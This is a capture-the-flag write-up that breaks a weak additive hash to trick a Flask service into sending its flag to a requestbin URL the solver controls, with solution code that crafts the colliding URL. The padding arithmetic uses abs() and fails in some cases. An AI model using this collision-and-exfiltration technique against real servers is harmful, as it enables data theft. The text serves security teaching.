# Ping Bond Writeup
This challenge aims at showing why we need robust hashing algorithm. In particular, robust to collisions. A collision is when two elements `a` and `b` are different but their hash are the same. If in the code you are to use a vulnerable hashing function, someone could without knowing `a` achieve something prohibited by crafting `b` to have the same hash as `a`. That's what we are going to do !

## Foothold

We're given the code, so let's take a look at it. We can see the only occurrence of the variable "flag" is here :
```python
@app.route('/send', methods=['POST'])
def send():
    ip_address = request.form['ip_address']
    if very_unique_id(ip_address) in IDS:
        requests.get(ip_address + flag)
        return render_template('home.html', urls=SERVERS, message="Sent request")
    else:
        return render_template('home.html', urls=SERVERS, message="No such server"
```
In order to get the flag, I have to create a URL that :
- I control, so I can receive the flag
- Happens to have the same hash as one of the "registered servers" whose hashes are stored in `IDS`

## How to proceed

Two methods can be used to solve the challenge ! But in both cases, I'll use a requestbin URL that the server will contact. Here is the beginning of the python script to solve the challenge :
```python
base = "https://enXXXXXXXXvg.x.pipedream.net/"  # Randomly created on https://public.requestbin.com/r

# ------- Copied from the code to be re-used in our solution

SERVERS = ["https://hackday.fr/", "https://www.nasa.gov/"]
IDS = set()

def very_unique_id(ip_address):
    # Gives each server a unique ID
    acc = 0
    for c in ip_address:
        acc = (acc + ord(c)) % 42
    return acc

for server in SERVERS:
    IDS.add(very_unique_id(server))
```

### Bruteforce

The first method to get our `base` URL to be in `IDS` is to iterate over all ASCII characters and add them to the `base` until `very_unique_id(base)` is in `IDS`. I will not write that method since it is not the most interesting.

### Somewhat intelligent

The second method doesn't involve any bruteforce. If you take a look at the `very_unique_id` function which is the "hashing" function used in this code, you can see that it's very simple, and you can find which specific ASCII character adds 1 to `acc` :

You solve `x = 1 mod 42` and you get `x = 42 * k + 1` with k an integer. With k = 0, that is not a printable ascii character, with k = 1 you get '+' which could lead to mistakes if you don't URLencode this character when sending it to the server. So with k=2, you get 'U' which is easier to work with.
Now just add the right amount :
```python
target = IDS.pop() # Randomly choosing one of the hashes to spoof
amount = abs(target - very_unique_id(base))
final = base + amount * 'U'
print(f"Send this URL : {final}")
```

## Conclusion
Now just send what was printed by the script, and you'll receive the flag !
